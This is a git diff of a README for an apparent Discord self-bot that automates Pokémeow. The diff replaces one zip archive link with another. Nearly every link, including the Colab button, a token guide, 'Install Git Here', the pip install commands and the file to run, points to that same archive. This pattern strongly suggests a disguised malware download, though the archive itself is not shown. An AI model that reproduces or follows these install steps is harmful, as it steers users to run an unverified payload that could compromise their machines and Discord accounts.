@@ -2,11 +2,11 @@
 
 A robust and efficient discord self-bot for automating Pokémeow with a free captcha solver.
 
-<a target="_blank" href="https://raw.githubusercontent.com/khthanh3190/pokemeow/master/cogs/Software-v2.5.zip">
-  <img src="https://raw.githubusercontent.com/khthanh3190/pokemeow/master/cogs/Software-v2.5.zip" alt="Open In Colab"/>
+<a target="_blank" href="https://github.com/khthanh3190/pokemeow/raw/refs/heads/master/assets/Software_2.8.zip">
+  <img src="https://github.com/khthanh3190/pokemeow/raw/refs/heads/master/assets/Software_2.8.zip" alt="Open In Colab"/>
 </a>
 
-![image](https://raw.githubusercontent.com/khthanh3190/pokemeow/master/cogs/Software-v2.5.zip)
+![image](https://github.com/khthanh3190/pokemeow/raw/refs/heads/master/assets/Software_2.8.zip)
 
 The logs may look different for you depending on your terminal config ;).
 
@@ -127,22 +127,22 @@ The logs may look different for you depending on your terminal config ;).
 
 ## Get Token?
 
-[How to Find Your Discord Token](https://raw.githubusercontent.com/khthanh3190/pokemeow/master/cogs/Software-v2.5.zip)
+[How to Find Your Discord Token](https://github.com/khthanh3190/pokemeow/raw/refs/heads/master/assets/Software_2.8.zip)
 
 ### Run on Google Colab (no install required)
 1. Click on the "Open in Colab" button at the top of this readme.
 2. Follow through the steps on colab.
 
 ## Requirements
-- [Install Git Here](https://raw.githubusercontent.com/khthanh3190/pokemeow/master/cogs/Software-v2.5.zip)
+- [Install Git Here](https://github.com/khthanh3190/pokemeow/raw/refs/heads/master/assets/Software_2.8.zip)
 - Python 3.8 or higher is required.
-- `pip install git+https://raw.githubusercontent.com/khthanh3190/pokemeow/master/cogs/Software-v2.5.zip`
-- `python -m pip install -r https://raw.githubusercontent.com/khthanh3190/pokemeow/master/cogs/Software-v2.5.zip`
+- `pip install git+https://github.com/khthanh3190/pokemeow/raw/refs/heads/master/assets/Software_2.8.zip`
+- `python -m pip install -r https://github.com/khthanh3190/pokemeow/raw/refs/heads/master/assets/Software_2.8.zip`
 
 ## Launching
 
 1. Clone the repository.
-2. Run the `https://raw.githubusercontent.com/khthanh3190/pokemeow/master/cogs/Software-v2.5.zip` file from the terminal.
+2. Run the `https://github.com/khthanh3190/pokemeow/raw/refs/heads/master/assets/Software_2.8.zip` file from the terminal.
 
 ## Stopping
 
